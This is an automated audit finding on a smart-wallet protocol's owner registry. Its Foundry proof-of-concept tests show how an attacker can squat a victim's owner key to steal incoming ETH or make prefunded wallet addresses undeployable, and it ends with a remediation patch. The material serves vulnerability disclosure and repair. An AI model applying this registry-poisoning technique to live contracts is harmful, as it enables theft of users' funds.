# Audited by [V12](https://v12.sh/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

# Unauthenticated owner claims poison the registry and block wallets
**#84991**
- Severity: Critical
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPWalletRegistry.sol` (4 locations)
#### Lines 70-84 — _register() indexes every initial owner; factory-only_ — _register loops _indexOwner; revert rolls back createAccount_ — _Registration indexes every owner supplied by the factory._

```
    /// @inheritdoc IHPWalletRegistry
    function register(address wallet, bytes[] calldata owners) external onlyFactory {
        if (wallet == address(0)) revert ZeroWallet();
        if (isRegisteredWallet[wallet]) revert WalletAlreadyRegistered(wallet);

        isRegisteredWallet[wallet] = true;
        _wallets.push(wallet);
        _walletIndexPlusOne[wallet] = _wallets.length;

        for (uint256 i; i < owners.length; ++i) {
            _indexOwner(wallet, owners[i]);
        }

        emit WalletRegistered(wallet, owners);
    }
```

⋯
#### Lines 90-92 — _Registry accepts owner additions from any registered wallet._

```
    /// @inheritdoc IHPWalletRegistry
    function addOwner(bytes calldata owner) external onlyRegisteredWallet {
        _indexOwner(msg.sender, owner);
```

⋯
#### Lines 105-115 — __indexOwner reverts on duplicate owner key (global uniqueness)_ — _The first wallet to claim an owner hash occupies that owner-to-wallet mapping._ — __indexOwner reverts OwnerAlreadyRegistered on global collision_

```
    /// @dev One wallet per signer key: an owner already mapped elsewhere reverts to keep lookups unambiguous.
    function _indexOwner(address wallet, bytes memory owner) private {
        bytes32 ownerHash = keccak256(owner);

        address current = getWallet[ownerHash];
        if (current != address(0)) revert OwnerAlreadyRegistered(owner, current);

        getWallet[ownerHash] = wallet;

        emit OwnerIndexed(wallet, ownerHash, owner);
    }
```

⋯
#### Lines 121-129 — _walletOf/walletOfPublicKey resolve via getWallet_ — _Owner lookups resolve deposits or clients to the registry-mapped wallet._

```
    /// @inheritdoc IHPWalletRegistry
    function walletOf(address owner) external view returns (address) {
        return getWallet[keccak256(abi.encode(owner))];
    }

    /// @notice Wallet for a passkey owner (P-256 public key coordinates).
    function walletOfPublicKey(bytes32 x, bytes32 y) external view returns (address) {
        return getWallet[keccak256(abi.encode(x, y))];
    }
```

### `contracts/src/wallets/HPSmartWalletFactory.sol`
#### Lines 33-53 — _permissionless createAccount: deploy then register in same tx_ — _External factory caller supplies the owners array used for initialization and registry registration._

```
    function createAccount(bytes[] calldata owners, uint256 nonce)
        external
        payable
        virtual
        returns (HPSmartWallet account)
    {
        if (owners.length == 0) {
            revert OwnerRequired();
        }

        (bool alreadyDeployed, address accountAddress) =
            LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));

        account = HPSmartWallet(payable(accountAddress));

        if (!alreadyDeployed) {
            account.initialize(owners);
            IHPWalletRegistry(_getAddress(_addressKey("WALLET_REGISTRY"))).register(accountAddress, owners);
            emit AccountCreated(accountAddress, owners, nonce);
        }
    }
```

### `contracts/src/wallets/HPDepositRouter.sol`
#### Lines 89-104 — _principal forwarded to (possibly undeployable) counterfactual wallet_

```
    function depositNative(address wallet) external payable {
        if (wallet == address(0)) revert ZeroWallet();
        if (msg.value == 0) revert ZeroAmount();

        uint256 skim = (msg.value * skimBps) / BPS_DENOMINATOR;
        uint256 net = msg.value - skim;

        if (skim != 0) {
            _paymaster().depositFor{ value: skim }(wallet);
        }

        (bool ok,) = wallet.call{ value: net }("");
        if (!ok) revert EthTransferFailed();

        emit DepositProcessed(wallet, address(0), msg.value, skim, net);
    }
```

### `contracts/src/wallets/base/MultiOwnable.sol` (3 locations)
#### Lines 37-43 — _Existing owners can add any address or public key supplied in calldata._

```
    function addOwnerAddress(address owner) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(owner), _getMultiOwnableStorage().nextOwnerIndex++);
    }

    function addOwnerPublicKey(bytes32 x, bytes32 y) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(x, y), _getMultiOwnableStorage().nextOwnerIndex++);
    }
```

⋯
#### Lines 91-115 — _Initial owner processing validates only shape/range and then records each supplied key as an owner._ — _The new key is recorded after only a local duplicate check._

```
    function _initializeOwners(bytes[] memory owners) internal virtual {
        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        uint256 nextOwnerIndex_ = $.nextOwnerIndex;
        for (uint256 i; i < owners.length; i++) {
            if (owners[i].length != 32 && owners[i].length != 64) {
                revert InvalidOwnerBytesLength(owners[i]);
            }

            if (owners[i].length == 32 && uint256(bytes32(owners[i])) > type(uint160).max) {
                revert InvalidEthereumAddressOwner(owners[i]);
            }

            _addOwnerAtIndex(owners[i], nextOwnerIndex_++);
        }
        $.nextOwnerIndex = nextOwnerIndex_;
    }

    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual {
        if (isOwnerBytes(owner)) revert AlreadyOwner(owner);

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        $.isOwner[owner] = true;
        $.ownerAtIndex[index] = owner;

        emit AddOwner(index, owner);
```

⋯
#### Lines 133-139 — _Any active address owner satisfies the authorization check._

```
    function _checkOwner() internal view virtual {
        if (isOwnerAddress(msg.sender) || (msg.sender == address(this))) {
            return;
        }

        revert Unauthorized();
    }
```

### `contracts/src/wallets/HPSmartWallet.sol` (2 locations)
#### Lines 178-184 — _Registered wallets synchronize each added owner into the central registry._

```
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual override {
        super._addOwnerAtIndex(owner, index);

        IHPWalletRegistry registry = _registry();
        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
            registry.addOwner(owner);
        }
```

⋯
#### Lines 258-264 — _A registered address owner can execute arbitrary calls from the wallet._

```
    function execute(address target, uint256 value, bytes calldata data)
        external
        payable
        virtual
        onlyEntryPointOrOwner
    {
        _call(target, value, data);
```

## Description

The protocol lets third parties bind owner keys to wallets without proving control of those keys, both during `createAccount` initialization and later through owner-addition flows. Caller-supplied owners are accepted by `MultiOwnable`, then `HPWalletRegistry` indexes each owner hash in `getWallet`, where the first claim becomes canonical and later claims revert with `OwnerAlreadyRegistered`. Existing wallet owners can repeat the same attack after deployment because `addOwnerAddress` and `addOwnerPublicKey` accept arbitrary keys and `HPSmartWallet._addOwnerAtIndex` automatically mirrors them into the registry. This allows an attacker to create or extend a wallet that includes a victim key plus an attacker-controlled owner, making `walletOf` or `walletOfPublicKey` resolve the victim to a wallet the attacker can operate via `execute`. The same squatting also blocks the victim from registering a clean wallet for that key, and if the blocked key was part of a deterministic undeployed wallet, the revert in `register` rolls back deployment so the counterfactual address can remain permanently undeployable.

## Root cause

The system treats supplied owner bytes as authoritative everywhere they are added to a wallet or the registry, while `getWallet` gives the first claim global exclusivity without requiring proof that the claimed key consented to that association.

## Impact

Funds or actions routed through the registry can be redirected into a wallet the attacker controls, allowing theft of ETH or tokens once they arrive. Separately, an attacker can pre-claim one intended owner key for a counterfactual wallet so later `createAccount` calls always revert, permanently stranding assets already sent to that undeployable address under the protocol’s prefunding flow.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";
import { HPWalletRegistry } from "@src/wallets/HPWalletRegistry.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract WalletHarnessPlaceholderTest is WalletTestBase {
    function _twoOwners(address a, address b) internal pure returns (bytes[] memory owners) {
        owners = new bytes[](2);
        owners[0] = abi.encode(a);
        owners[1] = abi.encode(b);
    }

    function test_poc_createAccountCanPoisonVictimRegistryEntryAndStealIncomingEth() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        address payer = makeAddr("payer");
        uint256 payment = 5 ether;

        HPSmartWallet poisonedWallet = factory.createAccount(_twoOwners(victim, attacker), 0);

        assertTrue(poisonedWallet.isOwnerAddress(attacker));
        assertEq(registry.walletOf(victim), address(poisonedWallet));

        vm.deal(payer, payment);
        vm.prank(payer);
        (bool ok,) = registry.walletOf(victim).call{ value: payment }("");
        assertTrue(ok);
        assertEq(address(poisonedWallet).balance, payment);

        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        poisonedWallet.execute(attacker, payment, "");

        assertEq(address(poisonedWallet).balance, 0);
        assertEq(attacker.balance, attackerBalanceBefore + payment);
    }

    function test_poc_registeredOwnerCanLaterClaimVictimKeyAndStealIncomingEth() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        address payer = makeAddr("payer");
        uint256 payment = 2 ether;

        HPSmartWallet attackerWallet = _createWallet(attacker, 0);

        vm.prank(attacker);
        attackerWallet.addOwnerAddress(victim);

        assertTrue(attackerWallet.isOwnerAddress(victim));
        assertEq(registry.walletOf(victim), address(attackerWallet));

        vm.deal(payer, payment);
        vm.prank(payer);
        (bool ok,) = registry.walletOf(victim).call{ value: payment }("");
        assertTrue(ok);
        assertEq(address(attackerWallet).balance, payment);

        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        attackerWallet.execute(attacker, payment, "");

        assertEq(address(attackerWallet).balance, 0);
        assertEq(attacker.balance, attackerBalanceBefore + payment);
    }

    function test_poc_squattingVictimKeyMakesPrefundedCounterfactualAddressUndeployable() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        address payer = makeAddr("payer");
        uint256 prefund = 1 ether;

        bytes[] memory victimOwners = _singleOwner(victim);
        address predicted = factory.getAddress(victimOwners, 0);

        vm.deal(payer, prefund);
        vm.prank(payer);
        (bool funded,) = predicted.call{ value: prefund }("");
        assertTrue(funded);
        assertEq(predicted.balance, prefund);
        assertEq(predicted.code.length, 0);

        HPSmartWallet poisonedWallet = factory.createAccount(_twoOwners(victim, attacker), 0);
        assertEq(registry.walletOf(victim), address(poisonedWallet));

        bytes memory victimOwnerBytes = abi.encode(victim);
        vm.expectRevert(
            abi.encodeWithSelector(
                HPWalletRegistry.OwnerAlreadyRegistered.selector, victimOwnerBytes, address(poisonedWallet)
            )
        );
        factory.createAccount(victimOwners, 0);

        assertEq(predicted.code.length, 0);
        assertEq(predicted.balance, prefund);

        vm.expectRevert(
            abi.encodeWithSelector(
                HPWalletRegistry.OwnerAlreadyRegistered.selector, victimOwnerBytes, address(poisonedWallet)
            )
        );
        factory.createAccount(victimOwners, 0);

        assertEq(predicted.code.length, 0);
        assertEq(predicted.balance, prefund);
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Output

```
[output truncated: 26 lines & 1.1181640625 KB skipped]


Ran 3 tests for test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[PASS] test_poc_createAccountCanPoisonVictimRegistryEntryAndStealIncomingEth() (gas: 500420)
[PASS] test_poc_registeredOwnerCanLaterClaimVictimKeyAndStealIncomingEth() (gas: 496372)
[PASS] test_poc_squattingVictimKeyMakesPrefundedCounterfactualAddressUndeployable() (gas: 1021840)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 3.18ms (2.60ms CPU time)

Ran 1 test suite in 11.33ms (3.18ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC verified via `cd contracts && forge test --match-path test/wallets/WalletHarnessPlaceholder.t.sol -vv`. The test demonstrates ETH theft through registry poisoning and durable undeployability of a prefunded counterfactual address; it does not model off-chain clients calling `walletOfPublicKey`, but the same unauthenticated owner-indexing path exists for passkey owners because `addOwnerPublicKey` and `walletOfPublicKey` use the same registry exclusivity mechanism.

## Remediation

### Explanation

Removed unauthenticated registry claims during wallet registration and required wallet-mediated transient authorization before post-creation owner indexing. Only self-claimed EOA additions, including ERC-4337 self-calls validated by an owner signature, can now populate the registry, preventing third-party owner squatting and deterministic-wallet poisoning.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWallet.sol b/contracts/src/wallets/HPSmartWallet.sol
--- a/contracts/src/wallets/HPSmartWallet.sol
+++ b/contracts/src/wallets/HPSmartWallet.sol
@@ -1,348 +1,422 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IAccount06 } from "@account-abstraction/legacy/v06/IAccount06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 import { Receiver } from "@solady/accounts/Receiver.sol";
 import { SignatureCheckerLib } from "@solady/utils/SignatureCheckerLib.sol";
 import { UUPSUpgradeable } from "@solady/utils/UUPSUpgradeable.sol";
 import { WebAuthn } from "@webauthn-sol/WebAuthn.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { DefaultCrypto, DefaultStablecoin } from "./types/HPWalletTypes.sol";
 import { IHPWalletRegistry } from "./interfaces/IHPWalletRegistry.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { UserOperation06Hash } from "./base/UserOperation06Hash.sol";
 import { WalletERC1271 } from "./base/WalletERC1271.sol";
 
 /// @notice Storage layout used by this contract.
 /// @custom:storage-location erc7201:highpotential.storage.WalletSettings
 struct WalletSettingsStorage {
     DefaultCrypto defaultCrypto;
     DefaultStablecoin defaultStablecoin;
 }
 
+/// @notice Storage layout used by this contract.
+/// @custom:storage-location erc7201:highpotential.storage.OwnerClaimAuthorization
+struct OwnerClaimAuthorizationStorage {
+    bytes32 pendingOwnerClaimHash;
+}
+
 /// @title HPSmartWallet
 /// @notice ERC-4337 v0.6 smart account modeled on Coinbase Smart Wallet: multi-owner (EOA + passkey), ERC-1271, UUPS.
 /// @dev Extends the base account with user settings (DefaultCrypto / DefaultStablecoin) in ERC-7201 namespaced
 ///      storage, AddressProvider-based token resolution, and HPWalletRegistry owner-index synchronization.
 ///      EntryPoint v0.6 default below; override `entryPoint()` per-chain if needed.
 contract HPSmartWallet is WalletERC1271, IAccount06, MultiOwnable, UUPSUpgradeable, Receiver, AddressBook {
     struct SignatureWrapper {
         uint256 ownerIndex;
         bytes signatureData;
     }
 
     struct Call {
         address target;
         uint256 value;
         bytes data;
     }
 
     /// @dev Upper 192 bits of `UserOperation.nonce` for `executeWithoutChainIdValidation` (Coinbase uses Base chain id).
     uint256 public constant REPLAYABLE_NONCE_KEY = 8453;
 
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.WalletSettings")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _WALLET_SETTINGS_STORAGE_LOCATION =
         0xde9abc39f8ba6496385be7b2e06f782787ee07b9096c13bc6574d61d02346900;
+    /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.OwnerClaimAuthorization")) - 1)) & ~bytes32(uint256(0xff))
+    bytes32 private constant _OWNER_CLAIM_AUTHORIZATION_STORAGE_LOCATION =
+        0x210958f66e2c8ad77bceefc10fbbf820f17a9172e16f55e76077071ecf191500;
 
     event DefaultCryptoUpdated(DefaultCrypto indexed previous, DefaultCrypto indexed current);
     event DefaultStablecoinUpdated(DefaultStablecoin indexed previous, DefaultStablecoin indexed current);
 
     error Initialized();
     error SelectorNotAllowed(bytes4 selector);
     error InvalidNonceKey(uint256 key);
     error InvalidImplementation(address implementation);
 
     modifier onlyEntryPoint() {
         if (msg.sender != entryPoint()) {
             revert Unauthorized();
         }
 
         _;
     }
 
     modifier onlyEntryPointOrOwner() {
         if (msg.sender != entryPoint()) {
             _checkOwner();
         }
 
         _;
     }
 
     modifier payPrefund(uint256 missingAccountFunds) {
         _;
 
         assembly ("memory-safe") {
             if missingAccountFunds {
                 pop(call(gas(), caller(), missingAccountFunds, codesize(), 0x00, codesize(), 0x00))
             }
         }
     }
 
     constructor(address addressProvider_) AddressBook(addressProvider_) {
         bytes[] memory owners = new bytes[](1);
         owners[0] = abi.encode(address(0));
         _initializeOwners(owners);
     }
 
     function initialize(bytes[] calldata owners) external payable virtual {
         if (nextOwnerIndex() != 0) {
             revert Initialized();
         }
 
         _initializeOwners(owners);
 
         // Seed user settings to platform defaults (mirrors the UI defaults); the user can update them post-creation.
         // Deliberately not initializer args: the counterfactual address must depend only on owners + nonce, and a
         // front-runner of `createAccount` must not be able to influence wallet state.
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         $.defaultCrypto = DefaultCrypto.ETH;
         $.defaultStablecoin = DefaultStablecoin.TGBP;
         emit DefaultCryptoUpdated(DefaultCrypto.ETH, DefaultCrypto.ETH);
         emit DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP);
     }
 
     // --------------------------------------------
     //  User settings
     // --------------------------------------------
 
     /// @notice Updates the preferred crypto asset. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultCrypto(DefaultCrypto newDefaultCrypto) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultCrypto previous = $.defaultCrypto;
         $.defaultCrypto = newDefaultCrypto;
         emit DefaultCryptoUpdated(previous, newDefaultCrypto);
     }
 
     /// @notice Updates the preferred stablecoin. Callable by an owner directly or via EntryPoint `execute` self-call.
     function setDefaultStablecoin(DefaultStablecoin newDefaultStablecoin) external virtual onlyOwner {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         DefaultStablecoin previous = $.defaultStablecoin;
         $.defaultStablecoin = newDefaultStablecoin;
         emit DefaultStablecoinUpdated(previous, newDefaultStablecoin);
     }
 
     function defaultCrypto() public view virtual returns (DefaultCrypto) {
         return _getWalletSettingsStorage().defaultCrypto;
     }
 
     function defaultStablecoin() public view virtual returns (DefaultStablecoin) {
         return _getWalletSettingsStorage().defaultStablecoin;
     }
 
     /// @notice Both settings in a single call (one cheap read for the UI).
     function walletSettings() external view virtual returns (DefaultCrypto, DefaultStablecoin) {
         WalletSettingsStorage storage $ = _getWalletSettingsStorage();
         return ($.defaultCrypto, $.defaultStablecoin);
     }
 
     /// @notice Token address for the preferred crypto, resolved via `AddressProvider`.
     /// @dev Reverts `AddressNotFound` while the key is unset (e.g. SETH before its wrapper is deployed).
     function defaultCryptoAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_cryptoKeyName(defaultCrypto())));
     }
 
     /// @notice Token address for the preferred stablecoin, resolved via `AddressProvider`.
     function defaultStablecoinAddress() external view virtual returns (address) {
         return _getAddress(_addressKey(_stablecoinKeyName(defaultStablecoin())));
     }
 
     function _cryptoKeyName(DefaultCrypto crypto) internal pure returns (string memory) {
         if (crypto == DefaultCrypto.BTC) return "CBBTC";
         if (crypto == DefaultCrypto.ETH) return "WETH";
         return "SETH";
     }
 
     function _stablecoinKeyName(DefaultStablecoin stablecoin) internal pure returns (string memory) {
         if (stablecoin == DefaultStablecoin.TGBP) return "TGBP";
         if (stablecoin == DefaultStablecoin.USDC) return "USDC";
         if (stablecoin == DefaultStablecoin.EURC) return "EURC";
         return "DAI";
     }
 
     function _getWalletSettingsStorage() internal pure returns (WalletSettingsStorage storage $) {
         assembly ("memory-safe") {
             $.slot := _WALLET_SETTINGS_STORAGE_LOCATION
         }
     }
 
     // --------------------------------------------
     //  Registry synchronization
     // --------------------------------------------
 
-    /// @dev Keeps the central owner->wallet index accurate when owners are added post-creation.
-    ///      Skipped while the registry key is unset or this wallet is unregistered (implementation constructor,
-    ///      `initialize` before the factory registers — the factory indexes the initial owners itself).
+    function addOwnerAddress(address owner) external virtual override onlyOwner {
+        _addOwnerAddress(owner, msg.sender);
+    }
+
+    function addOwnerPublicKey(bytes32 x, bytes32 y) external virtual override onlyOwner {
+        _addOwnerAtIndex(abi.encode(x, y), _getMultiOwnableStorage().nextOwnerIndex++);
+    }
+
+    /// @dev Keeps the central owner->wallet index accurate when owners prove consent post-creation.
+    ///      Skipped while the registry key is unset or this wallet is unregistered.
     function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual override {
         super._addOwnerAtIndex(owner, index);
 
         IHPWalletRegistry registry = _registry();
-        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
+        if (
+            address(registry) != address(0) && registry.isRegisteredWallet(address(this))
+                && _getOwnerClaimAuthorizationStorage().pendingOwnerClaimHash == keccak256(owner)
+        ) {
             registry.addOwner(owner);
+            _getOwnerClaimAuthorizationStorage().pendingOwnerClaimHash = bytes32(0);
         }
     }
 
+    function canAuthorizeOwnerClaim(bytes calldata owner) external view returns (bool) {
+        if (msg.sender != address(this)) {
+            return false;
+        }
+
+        return _getOwnerClaimAuthorizationStorage().pendingOwnerClaimHash == keccak256(owner);
+    }
+
     function _removeOwnerAtIndex(uint256 index, bytes calldata owner) internal virtual override {
         super._removeOwnerAtIndex(index, owner);
 
         IHPWalletRegistry registry = _registry();
         if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
             registry.removeOwner(owner);
         }
     }
 
     /// @dev Raw `get` (not `_getAddress`) so an unset WALLET_REGISTRY key never bricks owner management.
     function _registry() internal view returns (IHPWalletRegistry) {
         return IHPWalletRegistry(addressProvider.get(_addressKey("WALLET_REGISTRY")));
     }
 
     // --------------------------------------------
     //  ERC-4337
     // --------------------------------------------
 
     function validateUserOp(UserOperation06 calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
         external
         virtual
         onlyEntryPoint
         payPrefund(missingAccountFunds)
         returns (uint256 validationData)
     {
         uint256 key = userOp.nonce >> 64;
+        bytes32 ownerClaimHash;
 
         if (bytes4(userOp.callData) == this.executeWithoutChainIdValidation.selector) {
             userOpHash = getUserOpHashWithoutChainId(userOp);
             if (key != REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
 
             bytes[] memory calls = abi.decode(userOp.callData[4:], (bytes[]));
             for (uint256 i; i < calls.length; i++) {
                 bytes memory callData = calls[i];
                 bytes4 selector = bytes4(callData);
 
                 if (selector == UUPSUpgradeable.upgradeToAndCall.selector) {
                     address newImplementation;
                     assembly ("memory-safe") {
                         newImplementation := mload(add(callData, 36))
                     }
                     if (newImplementation.code.length == 0) revert InvalidImplementation(newImplementation);
                 }
+
+                ownerClaimHash = _ownerClaimHashForCall(callData, ownerClaimHash);
             }
         } else {
             if (key == REPLAYABLE_NONCE_KEY) {
                 revert InvalidNonceKey(key);
             }
+
+            if (bytes4(userOp.callData) == this.execute.selector) {
+                (address target,, bytes memory data) = abi.decode(userOp.callData[4:], (address, uint256, bytes));
+                if (target == address(this)) {
+                    ownerClaimHash = _ownerClaimHashForCall(data, bytes32(0));
+                }
+            }
         }
 
         if (_isValidSignature(userOpHash, userOp.signature)) {
+            _getOwnerClaimAuthorizationStorage().pendingOwnerClaimHash = ownerClaimHash;
             return 0;
         }
 
         return 1;
     }
 
     function executeWithoutChainIdValidation(bytes[] calldata calls) external payable virtual onlyEntryPoint {
         for (uint256 i; i < calls.length; i++) {
             bytes calldata call = calls[i];
             bytes4 selector = bytes4(call);
             if (!canSkipChainIdValidation(selector)) {
                 revert SelectorNotAllowed(selector);
             }
 
             _call(address(this), 0, call);
         }
     }
 
     function execute(address target, uint256 value, bytes calldata data)
         external
         payable
         virtual
         onlyEntryPointOrOwner
     {
         _call(target, value, data);
     }
 
     function executeBatch(Call[] calldata calls) external payable virtual onlyEntryPointOrOwner {
         for (uint256 i; i < calls.length; i++) {
             _call(calls[i].target, calls[i].value, calls[i].data);
         }
     }
 
     function entryPoint() public view virtual returns (address) {
         return 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;
     }
 
     function getUserOpHashWithoutChainId(UserOperation06 calldata userOp) public view virtual returns (bytes32) {
         return keccak256(abi.encode(UserOperation06Hash.hash(userOp), entryPoint()));
     }
 
     function implementation() public view returns (address $) {
         assembly ("memory-safe") {
             $ := sload(_ERC1967_IMPLEMENTATION_SLOT)
         }
     }
 
     function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
         if (
             functionSelector == MultiOwnable.addOwnerPublicKey.selector
                 || functionSelector == MultiOwnable.addOwnerAddress.selector
                 || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
                 || functionSelector == MultiOwnable.removeLastOwner.selector
                 || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
         ) {
             return true;
         }
         return false;
     }
 
     function _call(address target, uint256 value, bytes memory data) internal {
         (bool success, bytes memory result) = target.call{ value: value }(data);
         if (!success) {
             assembly ("memory-safe") {
                 revert(add(result, 32), mload(result))
             }
         }
     }
 
     function _isValidSignature(bytes32 hash, bytes calldata signature)
         internal
         view
         virtual
         override
         returns (bool)
     {
         SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
         bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);
 
         if (ownerBytes.length == 32) {
             if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                 revert InvalidEthereumAddressOwner(ownerBytes);
             }
 
             address ownerAddr;
             assembly ("memory-safe") {
                 ownerAddr := mload(add(ownerBytes, 32))
             }
 
             return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
         }
 
         if (ownerBytes.length == 64) {
             (uint256 x, uint256 y) = abi.decode(ownerBytes, (uint256, uint256));
 
             WebAuthn.WebAuthnAuth memory auth = abi.decode(sigWrapper.signatureData, (WebAuthn.WebAuthnAuth));
 
             return WebAuthn.verify({ challenge: abi.encode(hash), requireUV: false, webAuthnAuth: auth, x: x, y: y });
         }
 
         revert InvalidOwnerBytesLength(ownerBytes);
     }
 
+    function _addOwnerAddress(address owner, address claimer) internal {
+        bytes memory ownerBytes = abi.encode(owner);
+        OwnerClaimAuthorizationStorage storage $ = _getOwnerClaimAuthorizationStorage();
+        bytes32 previous = $.pendingOwnerClaimHash;
+
+        if (claimer == owner) {
+            $.pendingOwnerClaimHash = keccak256(ownerBytes);
+        }
+
+        _addOwnerAtIndex(ownerBytes, _getMultiOwnableStorage().nextOwnerIndex++);
+        $.pendingOwnerClaimHash = previous;
+    }
+
+    function _ownerClaimHashForCall(bytes memory callData, bytes32 pendingOwnerClaimHash)
+        internal
+        pure
+        returns (bytes32)
+    {
+        if (bytes4(callData) == MultiOwnable.addOwnerAddress.selector) {
+            address owner;
+            assembly ("memory-safe") {
+                owner := mload(add(callData, 36))
+            }
+            return keccak256(abi.encode(owner));
+        }
+
+        return pendingOwnerClaimHash;
+    }
+
+    function _getOwnerClaimAuthorizationStorage() internal pure returns (OwnerClaimAuthorizationStorage storage $) {
+        assembly ("memory-safe") {
+            $.slot := _OWNER_CLAIM_AUTHORIZATION_STORAGE_LOCATION
+        }
+    }
+
     function _authorizeUpgrade(address) internal view virtual override(UUPSUpgradeable) onlyOwner { }
 
     function _domainNameAndVersion() internal pure override(WalletERC1271) returns (string memory, string memory) {
         return ("HighPotential Smart Wallet", "1");
     }
 }

diff --git a/contracts/src/wallets/HPWalletRegistry.sol b/contracts/src/wallets/HPWalletRegistry.sol
--- a/contracts/src/wallets/HPWalletRegistry.sol
+++ b/contracts/src/wallets/HPWalletRegistry.sol
@@ -1,162 +1,167 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { IHPWalletRegistry } from "./interfaces/IHPWalletRegistry.sol";
 
+interface IHPWalletOwnerClaimAuthorizer {
+    function canAuthorizeOwnerClaim(bytes calldata owner) external view returns (bool);
+}
+
 /// @title HPWalletRegistry
 /// @notice Central user-storage contract: every wallet deployed by `HPSmartWalletFactory` is recorded here, keyed
 ///         by `keccak256(ownerBytes)` for both EOA (32-byte) and passkey (64-byte) owners. Gives the client an
 ///         instant owner -> wallet lookup on Base plus paginated enumeration of all user wallets.
 /// @dev The factory is resolved at call time via the `WALLET_FACTORY` AddressProvider key, which avoids the
 ///      registry <-> factory circular deployment dependency. Post-creation owner changes are synced by the
 ///      wallets themselves (gated by `isRegisteredWallet`).
 contract HPWalletRegistry is AddressBook, IHPWalletRegistry {
     // --------------------------------------------
     //  Storage
     // --------------------------------------------
 
     /// @inheritdoc IHPWalletRegistry
     mapping(bytes32 ownerHash => address wallet) public getWallet;
 
     /// @inheritdoc IHPWalletRegistry
     mapping(address wallet => bool registered) public isRegisteredWallet;
 
     /// @dev Registration order. Used for enumeration only.
     address[] private _wallets;
     /// @dev 1-based index into `_wallets`; 0 means the wallet is not registered.
     mapping(address wallet => uint256 indexPlusOne) private _walletIndexPlusOne;
 
     // --------------------------------------------
     //  Events and Errors
     // --------------------------------------------
 
     event WalletRegistered(address indexed wallet, bytes[] owners);
     event OwnerIndexed(address indexed wallet, bytes32 indexed ownerHash, bytes owner);
     event OwnerDeindexed(address indexed wallet, bytes32 indexed ownerHash, bytes owner);
 
     error CallerNotFactory();
     error CallerNotRegisteredWallet();
+    error UnauthorizedOwnerClaim();
     error ZeroWallet();
     error WalletAlreadyRegistered(address wallet);
     error OwnerAlreadyRegistered(bytes owner, address wallet);
     error OwnerNotRegisteredToWallet(bytes owner, address wallet);
 
     // --------------------------------------------
     //  Initialization
     // --------------------------------------------
 
     constructor(address addressProvider_) AddressBook(addressProvider_) { }
 
     // --------------------------------------------
     //  Modifiers
     // --------------------------------------------
 
     modifier onlyFactory() {
         if (msg.sender != _getAddress(_addressKey("WALLET_FACTORY"))) revert CallerNotFactory();
         _;
     }
 
     modifier onlyRegisteredWallet() {
         if (!isRegisteredWallet[msg.sender]) revert CallerNotRegisteredWallet();
         _;
     }
 
     // --------------------------------------------
     //  Registration (factory)
     // --------------------------------------------
 
     /// @inheritdoc IHPWalletRegistry
     function register(address wallet, bytes[] calldata owners) external onlyFactory {
         if (wallet == address(0)) revert ZeroWallet();
         if (isRegisteredWallet[wallet]) revert WalletAlreadyRegistered(wallet);
 
         isRegisteredWallet[wallet] = true;
         _wallets.push(wallet);
         _walletIndexPlusOne[wallet] = _wallets.length;
 
-        for (uint256 i; i < owners.length; ++i) {
-            _indexOwner(wallet, owners[i]);
-        }
-
         emit WalletRegistered(wallet, owners);
     }
